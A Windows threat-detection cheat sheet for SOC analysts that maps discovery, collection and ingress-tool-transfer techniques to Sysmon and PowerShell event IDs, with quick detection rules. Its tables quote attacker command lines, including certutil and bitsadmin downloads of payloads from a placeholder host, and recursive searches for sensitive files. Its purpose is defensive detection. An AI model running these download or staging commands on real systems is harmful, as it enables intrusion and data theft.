# 🔍 Windows Threat Detection: Post-Exploitation Cheat Sheet

A practical reference guide for SOC analysts covering detection techniques for **Discovery (TA0007)**, **Collection (TA0009)**, and **Ingress Tool Transfer (T1105)** in Windows environments.

---

## 1. System & Network Discovery Detection

Once inside, attackers execute native administrative tools (LOLBINs) to map the domain and system architecture.

### Key Discovery Commands & Event Artifacts
| Technique | Command / Tool | Source / Event ID | Detection Indicator |
| :--- | :--- | :--- | :--- |
| **Account Discovery** | `whoami`, `net user`, `net group` | Sysmon Event ID 1 / Event ID 4688 | High-frequency execution of CLI account queries |
| **Network Discovery** | `ipconfig /all`, `arp -a`, `netstat -ano` | Sysmon Event ID 1 | Rapid execution of network mapping utilities |
| **Domain Trust Discovery**| `nltest /domain_trusts` | Sysmon Event ID 1 | Querying active domain controllers and trust relationships |
| **Process Discovery** | `tasklist`, `Get-Process` | Sysmon Event ID 1 / PowerShell 4104 | Enumeration of running processes & security tools |

---

## 2. Data Collection Activity

Attackers collect sensitive files, databases, and credentials prior to staging for exfiltration.

### Staging & Archiving Artifacts
| Staging Action | Tools / Command Lines | Detection Focus |
| :--- | :--- | :--- |
| **File Archiving** | `tar.exe`, `7z.exe`, `rar.exe` | Creating compressed archives in temp directories (`C:\Windows\Temp`, `C:\Users\Public`) |
| **Automated Staging** | `robocopy`, `xcopy` | Bulk copying of `.docx`, `.xlsx`, or `.pdf` files to a central directory |
| **PowerShell Collection**| `Get-ChildItem -Recurse -Include *.txt` | PowerShell Event ID **4104** searching for sensitive extensions |

---

## 3. Ingress Tool Transfer (Downloading Payloads)

Attackers leverage built-in Windows tools to download external scripts, Cobalt Strike beacons, or C2 agents.

### Common LOLBINs Used for File Transfers
| Tool | Example Command Line Syntax | Event Logs & Indicators |
| :--- | :--- | :--- |
| **Certutil** | `certutil.exe -urlcache -f http://<IP>/payload.exe out.exe` | Sysmon 1 (`certutil` with `-urlcache`), Sysmon 11 (File creation) |
| **PowerShell** | `Invoke-WebRequest`, `(New-Object Net.WebClient).DownloadFile()` | PowerShell Event ID **4104** (ScriptBlock Logging) |
| **BITSAdmin** | `bitsadmin.exe /transfer myJob http://<IP>/file.exe C:\path\file.exe` | Sysmon 1 & BITS-Client Operational Event Logs |

---

## 💡 SOC Analyst Quick Rules

1. **Certutil Misuse:** `certutil.exe` is meant for certificate handling. Any network connection (Sysmon 3) or `-urlcache` flag triggered by `certutil.exe` is **99% malicious**.
2. **Batch Discovery Scripts:** Watch for multiple discovery commands (`whoami` -> `ipconfig` -> `net user`) executed within seconds of each other — indicates automated reconnaissance scripts.
3. **Temp Directory Writes:** Pay close attention to executable writes (Sysmon Event ID 11) or archive files dropped into `AppData\Local\Temp` or `C:\Users\Public\`.
